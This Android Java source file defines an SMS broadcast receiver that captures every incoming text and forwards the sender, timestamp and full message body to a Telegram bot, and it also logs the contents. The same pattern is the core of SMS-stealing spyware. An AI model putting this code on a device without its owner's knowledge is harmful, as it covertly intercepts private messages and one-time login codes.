package com.thunderx.telegramagent;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver {
    private static final String TAG = "SmsReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            if (intent == null || !"android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction()))
                return;

            Bundle bundle = intent.getExtras();
            if (bundle == null) return;

            Object[] pdus = (Object[]) bundle.get("pdus");
            if (pdus == null || pdus.length == 0) return;

            String format = bundle.getString("format");
            StringBuilder fullMsg = new StringBuilder();
            String sender = null;
            long timestamp = 0;

            for (Object pdu : pdus) {
                SmsMessage sms;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    sms = SmsMessage.createFromPdu((byte[]) pdu, format);
                } else {
                    sms = SmsMessage.createFromPdu((byte[]) pdu);
                }
                if (sms == null) continue;

                if (sender == null) {
                    sender = sms.getDisplayOriginatingAddress();
                    timestamp = sms.getTimestampMillis();
                }
                fullMsg.append(sms.getDisplayMessageBody());
            }

            if (sender == null || fullMsg.length() == 0) return;

            Log.d(TAG, "📩 SMS from " + sender + ": " + fullMsg);

            String time = new java.text.SimpleDateFormat("HH:mm:ss",
                    java.util.Locale.US).format(new java.util.Date(timestamp));

            TelegramAgentService.sendMessage("📩 *New Incoming SMS*\n\n" +
                    "From: `" + sender + "`\n" +
                    "Time: " + time + "\n" +
                    "Message:\n" + fullMsg.toString());

        } catch (Exception e) {
            Log.e(TAG, "SMS receive error: " + e.getMessage());
        }
    }
}